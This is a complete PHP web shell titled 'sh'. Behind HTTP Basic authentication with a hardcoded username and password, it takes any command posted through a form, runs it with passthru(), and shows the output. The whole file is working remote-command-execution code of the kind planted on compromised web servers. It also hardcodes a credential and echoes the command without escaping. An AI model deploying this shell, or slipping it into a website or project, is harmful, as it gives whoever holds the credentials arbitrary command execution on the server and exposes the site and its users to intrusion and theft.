<?php
set_time_limit(0);

$users = array('vikoff' => 'r00t+1');
$authorized = FALSE;

if (!isset($_SERVER['PHP_AUTH_USER'])) {
    $authorized = FALSE;
} elseif (isset($users[ $_SERVER['PHP_AUTH_USER'] ]) && $users[ $_SERVER['PHP_AUTH_USER'] ] === $_SERVER['PHP_AUTH_PW']) {
    $authorized = TRUE;
}
if (!$authorized) {
    header('WWW-Authenticate: Basic realm="Authorize"');
    header('HTTP/1.0 401 Unauthorized');
    die('Authorization required');
}

?>
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>sh</title>
	<style>
	.cmd-inp{
		border: solid 1px #DDD;
		padding: 5px 10px;
		font-family: monospace;
		font-size: 14px;
		width: 500px;
	}
	.cmd-show{
		background-color: #DDD;
		padding: 0 10px;
	}
	</style>
</head>
<body>
<?php

$command = !empty($_POST['command']) ? $_POST['command'] : '';
$stderr = !empty($_POST['stderr']);

if ($command) {
	$cmd = $command;
	if ($stderr)
		$cmd .= ' 2>&1';

	echo "<pre> ".getcwd()."$ <span class=\"cmd-show\">$cmd</span>:\n\n";
	passthru($cmd);
	echo "\n\n</pre><hr><br><br>";
}

?>

<form action="" method="post">
	<input class="cmd-inp" type="text" name="command" value="<?= htmlspecialchars($command); ?>">
	<label><input type="checkbox" name="stderr" value="1" checked>2>&1</label>
	<input type="submit" value="Run">
</form>

</body>
</html>